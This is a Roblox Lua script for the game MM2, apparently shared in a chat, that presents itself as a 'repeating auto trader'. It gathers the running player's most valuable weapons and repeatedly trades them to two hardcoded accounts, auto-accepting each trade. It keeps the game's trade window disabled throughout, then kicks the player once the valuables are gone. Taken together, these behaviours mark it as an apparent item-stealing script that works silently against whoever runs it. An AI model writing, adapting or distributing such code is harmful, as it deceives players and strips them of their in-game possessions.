We’re using this one right

--============================================================
-- BLIZZARD MM2 - COMPLETE REPEATING AUTO TRADER
--
-- PRIMARY:
--   Unique
--   Ancient
--   Godly
--   Classic = Vintage
--
-- FILLER:
--   Legendary only when a PRIMARY trade has free slots
--
-- BEHAVIOR:
--   • Exact approved target lock
--   • Up to 4 items per trade
--   • All 4 OfferItem calls sent immediately
--   • Exact offer verification
--   • 5.1 second proven accept delay
--   • Uses newest LastOffer
--   • Waits for AcceptTrade(success == true)
--   • Rescans inventory
--   • Repeats to SAME target
--   • Kicks only after all PRIMARY items are gone
--
-- NO __namecall
-- NO PRINTS
-- NO COPY LOGS
-- NO CLEAR LOGS
--============================================================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

--============================================================
-- CONFIG
--============================================================

local APPROVED_TARGETS = {
	{
		Username = "umpireblue",
		UserId = 368331177,
	},
	{
		Username = "gamermusaXD_YT",
		UserId = 505995718,
	},
}

local MAX_ITEMS_PER_TRADE = 4

local REQUEST_TIMEOUT = 30
local OFFER_TIMEOUT = 15

-- This is the delay from the version that actually worked.
local AUTO_ACCEPT_DELAY = 5.1

-- Allow InventoryModule to update after completed trade.
local RESCAN_DELAY = 1.25

local KICK_WHEN_FINISHED = true

local FINISHED_KICK_MESSAGE =
	"Trade transfer completed."

--============================================================
-- RARITIES
--============================================================

local PRIMARY_RARITIES = {
	Unique = true,
	Ancient = true,
	Godly = true,
	Classic = true, -- MM2 Vintage
}

local FILLER_RARITIES = {
	Legendary = true,
}

--============================================================
-- REMOTES
--============================================================

local Trade =
	ReplicatedStorage:WaitForChild("Trade")

local SendRequest =
	Trade:WaitForChild("SendRequest")

local StartTrade =
	Trade:WaitForChild("StartTrade")

local OfferItem =
	Trade:WaitForChild("OfferItem")

local UpdateTrade =
	Trade:WaitForChild("UpdateTrade")

local AcceptTrade =
	Trade:WaitForChild("AcceptTrade")

local DeclineTrade =
	Trade:FindFirstChild("DeclineTrade")

--============================================================
-- INVENTORY MODULE
--============================================================

local InventoryModule =
	require(
		ReplicatedStorage
			:WaitForChild("Modules")
			:WaitForChild("InventoryModule")
	)

--============================================================
-- STATE
--============================================================

local Running = false

local SelectedTargetMode = "AUTO"
local CurrentTarget = nil

local WaitingForTrade = false
local WaitingForOffer = false
local AcceptScheduled = false

local CurrentTradeState = nil

local PlannedItems = {}
local PlannedByID = {}

local TradeNumber = 0

local Connections = {}

--============================================================
-- GUI STATE
--============================================================

local StatusLabel
local InfoLabel
local TargetButton
local StartButton

--============================================================
-- MOBILE TRADE GUI BLOCKER
--============================================================

local TradeGuiBlockConnection = nil
local TradeGuiChildConnection = nil
local WatchedTradeGui = nil

--============================================================
-- STATUS
--============================================================

local function SetStatus(text)

	if StatusLabel then
		StatusLabel.Text =
			"Status: "
			.. tostring(text)
	end
end

local function SetInfo(text)

	if InfoLabel then
		InfoLabel.Text =
			tostring(text)
	end
end

--============================================================
-- HELPERS
--============================================================

local function Track(connection)

	table.insert(
		Connections,
		connection
	)
	return connection
end

local function SafeGet(tbl, key)

	if type(tbl) ~= "table" then
		return nil
	end
	local ok, result =
		pcall(function()
			return tbl[key]
		end)
	if ok then
		return result
	end
	return nil
end

local function First(tbl, keys)

	if type(tbl) ~= "table" then
		return nil
	end
	for _, key in ipairs(keys) do
		local value =
			SafeGet(tbl, key)
		if value ~= nil then
			return value
		end
	end
	return nil
end

local function GetItemID(tbl, keyHint)

	return First(
		tbl,
		{
			"DataID",
			"ItemID",
			"ID",
			"Id",
		}
	) or keyHint
end

local function GetItemName(tbl)

	return First(
		tbl,
		{
			"ItemName",
			"DisplayName",
			"Name",
		}
	)
end

local function GetItemRarity(tbl)

	return First(
		tbl,
		{
			"Rarity",
			"Tier",
		}
	)
end

local function GetItemType(tbl)

	return First(
		tbl,
		{
			"ItemType",
			"WeaponType",
			"Type",
		}
	)
end

local function GetItemAmount(tbl)

	return tonumber(
		First(
			tbl,
			{
				"Amount",
				"Count",
				"Quantity",
			}
		)
	) or 0
end

local function IsWeaponType(itemType)

	return itemType == "Knife"
		or itemType == "Gun"
end

--============================================================
-- INVENTORY SCANNER
--============================================================

local function GetWeaponsTable()

	local inventory =
		SafeGet(
			InventoryModule,
			"MyInventory"
		)
	local data =
		SafeGet(
			inventory,
			"Data"
		)
	return SafeGet(
		data,
		"Weapons"
	)
end

local function ScanInventory()

	local Weapons =
		GetWeaponsTable()
	if type(Weapons) ~= "table" then
		return {}, {}
	end
	local primary = {}
	local filler = {}
	local visited = {}
	local seenIDs = {}
	local function Walk(tbl, depth)
		if type(tbl) ~= "table" then
			return
		end
		if visited[tbl] then
			return
		end
		if depth > 10 then
			return
		end
		visited[tbl] = true
		for key, value in pairs(tbl) do
			if type(value) == "table" then
				local rarity =
					GetItemRarity(value)
				local itemType =
					GetItemType(value)
				local amount =
					GetItemAmount(value)
				if rarity
					and amount > 0
					and IsWeaponType(itemType)
				then
					local dataID =
						tostring(
							GetItemID(
								value,
								key
							)
						)
					if not seenIDs[dataID] then
						seenIDs[dataID] = true
						local item = {
							DataID = dataID,
							Name =
								tostring(
									GetItemName(value)
									or dataID
								),
							Rarity =
								tostring(rarity),
							ItemType =
								tostring(itemType),
							Amount =
								amount,
						}
						if PRIMARY_RARITIES[
							item.Rarity
						] then
							table.insert(
								primary,
								item
							)
						elseif FILLER_RARITIES[
							item.Rarity
						] then
							table.insert(
								filler,
								item
							)
						end
					end
				end
				Walk(
					value,
					depth + 1
				)
			end
		end
	end
	Walk(
		Weapons,
		0
	)
	local priority = {
		Unique = 1,
		Ancient = 2,
		Godly = 3,
		Classic = 4,
	}
	table.sort(
		primary,
		function(a, b)
			local pa =
				priority[a.Rarity]
				or 99
			local pb =
				priority[b.Rarity]
				or 99
			if pa ~= pb then
				return pa < pb
			end
			return a.DataID
				< b.DataID
		end
	)
	table.sort(
		filler,
		function(a, b)
			return a.DataID
				< b.DataID
		end
	)
	return primary, filler
end

--============================================================
-- BUILD BATCH
--============================================================

local function BuildBatch()

	local primary, filler =
		ScanInventory()
	if #primary == 0 then
		return nil,
			primary,
			filler
	end
	local batch = {}
	--========================================================
	-- PRIMARY FIRST
	--========================================================
	for _, item in ipairs(primary) do
		if #batch
			>= MAX_ITEMS_PER_TRADE
		then
			break
		end
		table.insert(
			batch,
			item
		)
	end
	--========================================================
	-- LEGENDARY ONLY FILLS UNUSED SLOTS
	--========================================================
	if #batch
		< MAX_ITEMS_PER_TRADE
	then
		for _, item in ipairs(filler) do
			if #batch
				>= MAX_ITEMS_PER_TRADE
			then
				break
			end
			table.insert(
				batch,
				item
			)
		end
	end
	return batch,
		primary,
		filler
end

--============================================================
-- TARGET HELPERS
--============================================================

local function GetApprovedDefinition(username)

	for _, definition in ipairs(
		APPROVED_TARGETS
	) do
		if definition.Username
			== username
		then
			return definition
		end
	end
	return nil
end

local function FindApprovedTarget(username)

	local definition =
		GetApprovedDefinition(
			username
		)
	if not definition then
		return nil
	end
	local player =
		Players:FindFirstChild(
			definition.Username
		)
	if player
		and player.UserId
			== definition.UserId
	then
		return player
	end
	return nil
end

local function ResolveTarget()

	--========================================================
	-- MANUAL TARGET
	--========================================================
	if SelectedTargetMode
		~= "AUTO"
	then
		return FindApprovedTarget(
			SelectedTargetMode
		)
	end
	--========================================================
	-- AUTO TARGET
	--========================================================
	local found = {}
	for _, definition in ipairs(
		APPROVED_TARGETS
	) do
		local player =
			FindApprovedTarget(
				definition.Username
			)
		if player then
			table.insert(
				found,
				player
			)
		end
	end
	-- Never guess if both approved targets are present.
	if #found == 1 then
		return found[1]
	end
	return nil
end

local function VerifyCurrentTarget()

	if not CurrentTarget then
		return false
	end
	if CurrentTarget.Parent
		~= Players
	then
		return false
	end
	local definition =
		GetApprovedDefinition(
			CurrentTarget.Name
		)
	if not definition then
		return false
	end
	return CurrentTarget.UserId
		== definition.UserId
end

--============================================================
-- STARTTRADE TARGET PARSER
--============================================================

local function IsExactCurrentTarget(player)

	if not player
		or not CurrentTarget
	then
		return false
	end
	return player.Name
			== CurrentTarget.Name
		and player.UserId
			== CurrentTarget.UserId
end

local function FindTargetInValue(
	value,
	depth,
	visited
)

	depth = depth or 0
	visited = visited or {}
	if depth > 7 then
		return nil
	end
	--========================================================
	-- PLAYER
	--========================================================
	if typeof(value) == "Instance"
		and value:IsA("Player")
	then
		if IsExactCurrentTarget(value) then
			return value
		end
		return nil
	end
	--========================================================
	-- USERNAME
	--========================================================
	if type(value) == "string" then
		if CurrentTarget
			and value
				== CurrentTarget.Name
		then
			local player =
				Players:FindFirstChild(
					value
				)
			if IsExactCurrentTarget(
				player
			) then
				return player
			end
		end
		return nil
	end
	--========================================================
	-- USERID
	--========================================================
	if type(value) == "number" then
		if CurrentTarget
			and value
				== CurrentTarget.UserId
		then
			local player =
				Players:GetPlayerByUserId(
					value
				)
			if IsExactCurrentTarget(
				player
			) then
				return player
			end
		end
		return nil
	end
	--========================================================
	-- TABLE
	--========================================================
	if type(value) ~= "table" then
		return nil
	end
	if visited[value] then
		return nil
	end
	visited[value] = true
	for _, key in ipairs({
		"Name",
		"Username",
		"UserName",
		"PlayerName",
		"OtherPlayerName",
		"TargetName",
	}) do
		local name =
			value[key]
		if type(name) == "string"
			and CurrentTarget
			and name
				== CurrentTarget.Name
		then
			local player =
				Players:FindFirstChild(
					name
				)
			if IsExactCurrentTarget(
				player
			) then
				return player
			end
		end
	end
	for _, key in ipairs({
		"UserId",
		"UserID",
		"PlayerId",
		"PlayerID",
		"TargetUserId",
		"OtherUserId",
	}) do
		local userId =
			tonumber(
				value[key]
			)
		if userId
			and CurrentTarget
			and userId
				== CurrentTarget.UserId
		then
			local player =
				Players:GetPlayerByUserId(
					userId
				)
			if IsExactCurrentTarget(
				player
			) then
				return player
			end
		end
	end
	for _, nested in pairs(value) do
		local found =
			FindTargetInValue(
				nested,
				depth + 1,
				visited
			)
		if found then
			return found
		end
	end
	return nil
end

local function ExtractOtherPlayer(...)

	for index = 1, select("#", ...) do
		local value =
			select(
				index,
				...
			)
		local player =
			FindTargetInValue(
				value
			)
		if player then
			return player
		end
	end
	return nil
end

--============================================================
-- TRADE STATE
--============================================================

local function LooksLikeTradeState(tbl)

	if type(tbl) ~= "table" then
		return false
	end
	return tbl.LastOffer ~= nil
		or tbl.Offer ~= nil
		or tbl.MyOffer ~= nil
		or tbl.YourOffer ~= nil
end

local function ExtractTradeState(...)

	for index = 1, select("#", ...) do
		local value =
			select(
				index,
				...
			)
		if LooksLikeTradeState(
			value
		) then
			return value
		end
	end
	return nil
end

--============================================================
-- OFFER VERIFICATION
--============================================================

local function IsOfferEntry(entry)

	return type(entry) == "table"
		and type(entry[1]) == "string"
		and tonumber(entry[2]) ~= nil
		and type(entry[3]) == "string"
end

local function LooksLikeOfferList(tbl)

	if type(tbl) ~= "table" then
		return false
	end
	for _, value in pairs(tbl) do
		if IsOfferEntry(value) then
			return true
		end
	end
	return false
end

local function CollectOfferLists(root)

	local results = {}
	local visited = {}
	local function Walk(tbl, depth)
		if type(tbl) ~= "table" then
			return
		end
		if visited[tbl] then
			return
		end
		if depth > 7 then
			return
		end
		visited[tbl] = true
		if LooksLikeOfferList(tbl) then
			table.insert(
				results,
				tbl
			)
		end
		for _, value in pairs(tbl) do
			if type(value) == "table" then
				Walk(
					value,
					depth + 1
				)
			end
		end
	end
	Walk(
		root,
		0
	)
	return results
end

local function SetPlannedItems(batch)

	PlannedItems = {}
	PlannedByID = {}
	for _, item in ipairs(batch) do
		table.insert(
			PlannedItems,
			item
		)
		PlannedByID[
			item.DataID
		] = true
	end
end

local function OfferListMatchesPlan(
	offerList
)

	local seen = {}
	local count = 0
	for _, entry in pairs(
		offerList
	) do
		if IsOfferEntry(entry) then
			local dataID =
				tostring(
					entry[1]
				)
			local amount =
				tonumber(
					entry[2]
				) or 0
			local category =
				tostring(
					entry[3]
				)
			if category == "Weapons" then
				count += 1
				seen[dataID] =
					amount
			end
		end
	end
	if count
		~= #PlannedItems
	then
		return false
	end
	for _, planned in ipairs(
		PlannedItems
	) do
		local amount =
			seen[
				planned.DataID
			]
		if not amount
			or amount < 1
		then
			return false
		end
	end
	-- No unexpected items allowed.
	for dataID in pairs(seen) do
		if not PlannedByID[
			dataID
		] then
			return false
		end
	end
	return true
end

local function VerifyCurrentOffer()

	if type(CurrentTradeState)
		~= "table"
	then
		return false
	end
	local offerLists =
		CollectOfferLists(
			CurrentTradeState
		)
	for _, offerList in ipairs(
		offerLists
	) do
		if OfferListMatchesPlan(
			offerList
		) then
			return true
		end
	end
	return false
end

--============================================================
-- MOBILE TRADE GUI BLOCKER
--============================================================

local function DisconnectTradeGuiWatch()

	if TradeGuiBlockConnection then
		TradeGuiBlockConnection:Disconnect()
		TradeGuiBlockConnection =
			nil
	end
	WatchedTradeGui = nil
end

local function WatchTradeGUI(gui)

	if not gui
		or not gui:IsA("ScreenGui")
	then
		return
	end
	if WatchedTradeGui == gui then
		gui.Enabled = false
		return
	end
	DisconnectTradeGuiWatch()
	WatchedTradeGui =
		gui
	gui.Enabled =
		false
	TradeGuiBlockConnection =
		gui
			:GetPropertyChangedSignal(
				"Enabled"
			)
			:Connect(
				function()
					if Running
						and gui.Parent
						and gui.Enabled
					then
						gui.Enabled =
							false
					end
				end
			)
end

local function KeepTradeGUIHidden()

	local gui =
		PlayerGui:FindFirstChild(
			"TradeGUI_Phone"
		)
	if gui then
		WatchTradeGUI(
			gui
		)
		if gui:IsA("ScreenGui") then
			gui.Enabled = false
		end
	end
end

local function ArmTradeGUIBlocker()

	DisconnectTradeGuiWatch()
	if TradeGuiChildConnection then
		TradeGuiChildConnection:Disconnect()
		TradeGuiChildConnection =
			nil
	end
	local existing =
		PlayerGui:FindFirstChild(
			"TradeGUI_Phone"
		)
	if existing then
		WatchTradeGUI(
			existing
		)
	end
	TradeGuiChildConnection =
		PlayerGui.ChildAdded:Connect(
			function(child)
				if Running
					and child.Name
						== "TradeGUI_Phone"
				then
					WatchTradeGUI(
						child
					)
				end
			end
		)
end

local function DisarmTradeGUIBlocker()

	DisconnectTradeGuiWatch()
	if TradeGuiChildConnection then
		TradeGuiChildConnection:Disconnect()
		TradeGuiChildConnection =
			nil
	end
end

--============================================================
-- STOP
--============================================================

local function StopTrader(status)

	Running = false
	WaitingForTrade = false
	WaitingForOffer = false
	AcceptScheduled = false
	CurrentTradeState = nil
	DisarmTradeGUIBlocker()
	SetStatus(
		status
		or "Stopped"
	)
	if StartButton then
		StartButton.Text =
			"START AUTO TRADER"
	end
end

--============================================================
-- FORWARD DECLARATION
--============================================================

local StartNextTrade

--============================================================
-- FINAL ACCEPT
--============================================================

local function ScheduleAccept()

	if AcceptScheduled
		or not Running
	then
		return
	end
	if not VerifyCurrentTarget() then
		StopTrader(
			"Target verification failed"
		)
		return
	end
	if type(CurrentTradeState)
		~= "table"
	then
		return
	end
	if CurrentTradeState.LastOffer
		== nil
	then
		return
	end
	if not VerifyCurrentOffer() then
		return
	end
	AcceptScheduled =
		true
	SetStatus(
		"Offer verified - waiting to accept"
	)
	--========================================================
	-- RESTORED WORKING 5.1 SECOND ACCEPT TIMING
	--========================================================
	task.delay(
		AUTO_ACCEPT_DELAY,
		function()
			if not Running then
				return
			end
			if not VerifyCurrentTarget() then
				StopTrader(
					"Target left"
				)
				return
			end
			if type(CurrentTradeState)
					~= "table"
				or CurrentTradeState.LastOffer
					== nil
			then
				AcceptScheduled =
					false
				return
			end
			--================================================
			-- VERIFY AGAIN DIRECTLY BEFORE FINAL ACCEPT
			--================================================
			if not VerifyCurrentOffer() then
				AcceptScheduled =
					false
				SetStatus(
					"Offer changed"
				)
				return
			end
			--================================================
			-- IMPORTANT:
			-- ALWAYS USE THE NEWEST LASTOFFER TOKEN.
			--================================================
			local LatestLastOffer =
				CurrentTradeState.LastOffer
			SetStatus(
				"Accepting trade"
			)
			--================================================
			-- THIS IS THE FINAL "ARE YOU SURE?" CONFIRMATION.
			--================================================
			AcceptTrade:FireServer(
				game.PlaceId * 3,
				LatestLastOffer
			)
			SetStatus(
				"Waiting for friend"
			)
		end
	)
end

--============================================================
-- OFFER ALL ITEMS IMMEDIATELY
--============================================================

local function OfferPlannedItems()

	if not Running then
		return
	end
	if not VerifyCurrentTarget() then
		StopTrader(
			"Target verification failed"
		)
		return
	end
	SetStatus(
		"Adding "
		.. tostring(
			#PlannedItems
		)
		.. " items"
	)
	--========================================================
	-- ALL OFFER REMOTES SENT BACK-TO-BACK.
	-- NO WAIT BETWEEN THEM.
	--========================================================
	for _, item in ipairs(
		PlannedItems
	) do
		OfferItem:FireServer(
			item.DataID,
			"Weapons"
		)
	end
	WaitingForOffer =
		true
	SetStatus(
		"Verifying offer"
	)
	--========================================================
	-- FAIL-SAFE
	--========================================================
	task.delay(
		OFFER_TIMEOUT,
		function()
			if Running
				and WaitingForOffer
				and not AcceptScheduled
			then
				StopTrader(
					"Offer verification timed out"
				)
			end
		end
	)
end

--============================================================
-- START NEXT TRADE
--============================================================

StartNextTrade = function()

	if not Running then
		return
	end
	if not VerifyCurrentTarget() then
		StopTrader(
			"Target unavailable"
		)
		return
	end
	local batch,
		primary,
		filler =
		BuildBatch()
	--========================================================
	-- NO PRIMARY ITEMS REMAIN
	--========================================================
	if not batch then
		Running =
			false
		DisarmTradeGUIBlocker()
		SetStatus(
			"Completed"
		)
		SetInfo(
			"All valuable items transferred."
		)
		if StartButton then
			StartButton.Text =
				"COMPLETED"
		end
		if KICK_WHEN_FINISHED then
			task.delay(
				0.5,
				function()
					LocalPlayer:Kick(
						FINISHED_KICK_MESSAGE
					)
				end
			)
		end
		return
	end
	--========================================================
	-- START ANOTHER SESSION
	--========================================================
	TradeNumber += 1
	CurrentTradeState =
		nil
	WaitingForTrade =
		true
	WaitingForOffer =
		false
	AcceptScheduled =
		false
	SetPlannedItems(
		batch
	)
	SetStatus(
		"Trade #"
		.. tostring(
			TradeNumber
		)
		.. " requesting"
	)
	SetInfo(
		"Target: "
		.. CurrentTarget.Name
		.. " | Primary left: "
		.. tostring(
			#primary
		)
		.. " | Sending: "
		.. tostring(
			#batch
		)
	)
	-- Block UI before request.
	KeepTradeGUIHidden()
	task.spawn(
		function()
			-- MM2 may return false even though
			-- StartTrade successfully occurs.
			pcall(
				function()
					SendRequest:InvokeServer(
						CurrentTarget
					)
				end
			)
		end
	)
	--========================================================
	-- REQUEST TIMEOUT
	--========================================================
	task.delay(
		REQUEST_TIMEOUT,
		function()
			if Running
				and WaitingForTrade
			then
				StopTrader(
					"Trade request timed out"
				)
			end
		end
	)
end

--============================================================
-- STARTTRADE EVENT
--============================================================

Track(
	StartTrade.OnClientEvent:Connect(
		function(...)
			if not Running then
				return
			end
			KeepTradeGUIHidden()
			if not VerifyCurrentTarget() then
				StopTrader(
					"Target verification failed"
				)
				return
			end
			local other =
				ExtractOtherPlayer(...)
			--================================================
			-- IF MM2 PROVIDES PARTNER DATA, IT MUST MATCH.
			--================================================
			if other
				and not IsExactCurrentTarget(
					other
				)
			then
				StopTrader(
					"Wrong trade partner"
				)
				return
			end
			WaitingForTrade =
				false
			local tradeState =
				ExtractTradeState(...)
			if tradeState then
				CurrentTradeState =
					tradeState
			end
			SetStatus(
				"Trade opened"
			)
			--================================================
			-- ADD ALL 4 AS FAST AS POSSIBLE
			--================================================
			task.defer(
				OfferPlannedItems
			)
		end
	)
)

--============================================================
-- UPDATETRADE EVENT
--============================================================

Track(
	UpdateTrade.OnClientEvent:Connect(
		function(...)
			if not Running then
				return
			end
			KeepTradeGUIHidden()
			local state =
				ExtractTradeState(...)
			if state then
				-- Always keep latest state + LastOffer.
				CurrentTradeState =
					state
			end
			--================================================
			-- WAIT UNTIL EXACT FULL OFFER EXISTS
			--================================================
			if VerifyCurrentOffer() then
				WaitingForOffer =
					false
				if not AcceptScheduled
					and CurrentTradeState
					and CurrentTradeState.LastOffer
						~= nil
				then
					ScheduleAccept()
				end
			end
		end
	)
)

--============================================================
-- ACCEPTTRADE EVENT
--============================================================

Track(
	AcceptTrade.OnClientEvent:Connect(
		function(success)
			if not Running then
				return
			end
			KeepTradeGUIHidden()
			--================================================
			-- SERVER CONFIRMED COMPLETED TRADE
			--================================================
			if success == true then
				CurrentTradeState =
					nil
				WaitingForTrade =
					false
				WaitingForOffer =
					false
				AcceptScheduled =
					false
				SetStatus(
					"Trade #"
					.. tostring(
						TradeNumber
					)
					.. " completed"
				)
				SetInfo(
					"Updating inventory..."
				)
				--================================================
				-- RESCAN AND AUTOMATICALLY TRADE AGAIN
				--================================================
				task.delay(
					RESCAN_DELAY,
					function()
						if Running then
							StartNextTrade()
						end
					end
				)
			else
				-- success=false means other side accepted.
				-- Keep waiting for success=true.
				SetStatus(
					"Friend accepted / waiting"
				)
			end
		end
	)
)

--============================================================
-- DECLINE
--============================================================

if DeclineTrade
	and DeclineTrade:IsA(
		"RemoteEvent"
	)
then

	Track(
		DeclineTrade.OnClientEvent:Connect(
			function()
				if Running then
					StopTrader(
						"Trade declined"
					)
				end
			end
		)
	)
end

--============================================================
-- START AUTO TRADER
--============================================================

local function StartAutoTrader()

	if Running then
		return
	end
	local target =
		ResolveTarget()
	if not target then
		SetStatus(
			"Target unavailable"
		)
		SetInfo(
			"If both approved players are present, choose one manually."
		)
		return
	end
	local primary,
		filler =
		ScanInventory()
	if #primary == 0 then
		SetStatus(
			"No primary valuables"
		)
		SetInfo(
			"Legendary alone will not start another trade."
		)
		return
	end
	--========================================================
	-- LOCK TARGET FOR ENTIRE RUN
	--========================================================
	CurrentTarget =
		target
	TradeNumber =
		0
	Running =
		true
	WaitingForTrade =
		false
	WaitingForOffer =
		false
	AcceptScheduled =
		false
	CurrentTradeState =
		nil
	ArmTradeGUIBlocker()
	StartButton.Text =
		"RUNNING..."
	SetStatus(
		"Starting"
	)
	SetInfo(
		"Target: "
		.. CurrentTarget.Name
		.. " | Primary: "
		.. tostring(
			#primary
		)
		.. " | Legendary: "
		.. tostring(
			#filler
		)
	)
	StartNextTrade()
end

--============================================================
-- REMOVE OLD GUI
--============================================================

local OldGUI =
	PlayerGui:FindFirstChild(
		"BlizzardRepeatingAutoTrader"
	)

if OldGUI then
	OldGUI:Destroy()
end

--============================================================
-- GUI
--============================================================

local Gui =
	Instance.new(
		"ScreenGui"
	)

Gui.Name =
	"BlizzardRepeatingAutoTrader"

Gui.ResetOnSpawn =
	false

Gui.DisplayOrder =
	999999

Gui.Parent =
	PlayerGui

--============================================================
-- MAIN FRAME
--============================================================

local Main =
	Instance.new(
		"Frame"
	)

Main.Size =
	UDim2.fromOffset(
		330,
		190
	)

Main.Position =
	UDim2.new(
		0.5,
		-165,
		0.5,
		-95
	)

Main.BackgroundColor3 =
	Color3.fromRGB(
		21,
		21,
		26
	)

Main.BorderSizePixel =
	0

Main.Active =
	true

Main.Draggable =
	true

Main.Parent =
	Gui

local MainCorner =
	Instance.new(
		"UICorner"
	)

MainCorner.CornerRadius =
	UDim.new(
		0,
		8
	)

MainCorner.Parent =
	Main

--============================================================
-- TITLE
--============================================================

local Title =
	Instance.new(
		"TextLabel"
	)

Title.Size =
	UDim2.new(
		1,
		-16,
		0,
		28
	)

Title.Position =
	UDim2.fromOffset(
		8,
		5
	)

Title.BackgroundTransparency =
	1

Title.Text =
	"Blizzard Repeating Auto Trader"

Title.TextColor3 =
	Color3.new(
		1,
		1,
		1
	)

Title.Font =
	Enum.Font.GothamBold

Title.TextSize =
	14

Title.TextXAlignment =
	Enum.TextXAlignment.Left

Title.Parent =
	Main

--============================================================
-- STATUS
--============================================================

StatusLabel =
	Instance.new(
		"TextLabel"
	)

StatusLabel.Size =
	UDim2.new(
		1,
		-16,
		0,
		20
	)

StatusLabel.Position =
	UDim2.fromOffset(
		8,
		34
	)

StatusLabel.BackgroundTransparency =
	1

StatusLabel.Text =
	"Status: Ready"

StatusLabel.TextColor3 =
	Color3.fromRGB(
		220,
		220,
		225
	)

StatusLabel.Font =
	Enum.Font.Gotham

StatusLabel.TextSize =
	11

StatusLabel.TextXAlignment =
	Enum.TextXAlignment.Left

StatusLabel.Parent =
	Main

--============================================================
-- INFO
--============================================================

InfoLabel =
	Instance.new(
		"TextLabel"
	)

InfoLabel.Size =
	UDim2.new(
		1,
		-16,
		0,
		28
	)

InfoLabel.Position =
	UDim2.fromOffset(
		8,
		55
	)

InfoLabel.BackgroundTransparency =
	1

InfoLabel.Text =
	"Trades all valuables, rescans, then repeats."

InfoLabel.TextWrapped =
	true

InfoLabel.TextColor3 =
	Color3.fromRGB(
		175,
		175,
		185
	)

InfoLabel.Font =
	Enum.Font.Gotham

InfoLabel.TextSize =
	10

InfoLabel.TextXAlignment =
	Enum.TextXAlignment.Left

InfoLabel.Parent =
	Main

--============================================================
-- BUTTON HELPER
--============================================================

local function MakeButton(
	text,
	position,
	size
)

	local button =
		Instance.new(
			"TextButton"
		)
	button.Size =
		size
	button.Position =
		position
	button.BackgroundColor3 =
		Color3.fromRGB(
			37,
			37,
			44
		)
	button.BorderSizePixel =
		0
	button.Text =
		text
	button.TextColor3 =
		Color3.new(
			1,
			1,
			1
		)
	button.Font =
		Enum.Font.GothamBold
	button.TextSize =
		11
	button.Parent =
		Main
	local corner =
		Instance.new(
			"UICorner"
		)
	corner.CornerRadius =
		UDim.new(
			0,
			6
		)
	corner.Parent =
		button
	return button
end

--============================================================
-- TARGET SELECTOR
--============================================================

TargetButton =
	MakeButton(
		"TARGET: AUTO",
		UDim2.fromOffset(
			8,
			90
		),
		UDim2.new(
			1,
			-16,
			0,
			28
		)
	)

local TargetModes = {
	"AUTO",
	"umpireblue",
	"gamermusaXD_YT",
}

local TargetIndex =
	1

TargetButton.MouseButton1Click:Connect(
	function()
		if Running then
			return
		end
		TargetIndex += 1
		if TargetIndex
			> #TargetModes
		then
			TargetIndex =
				1
		end
		SelectedTargetMode =
			TargetModes[
				TargetIndex
			]
		TargetButton.Text =
			"TARGET: "
			.. SelectedTargetMode
	end
)

--============================================================
-- START
--============================================================

StartButton =
	MakeButton(
		"START AUTO TRADER",
		UDim2.fromOffset(
			8,
			124
		),
		UDim2.new(
			1,
			-16,
			0,
			28
		)
	)

StartButton.MouseButton1Click:Connect(
	StartAutoTrader
)

--============================================================
-- STOP
--============================================================

local StopButton =
	MakeButton(
		"STOP",
		UDim2.fromOffset(
			8,
			157
		),
		UDim2.new(
			1,
			-16,
			0,
			25
		)
	)

StopButton.MouseButton1Click:Connect(
	function()
		if Running then
			StopTrader(
				"Stopped manually"
			)
		end
	end
)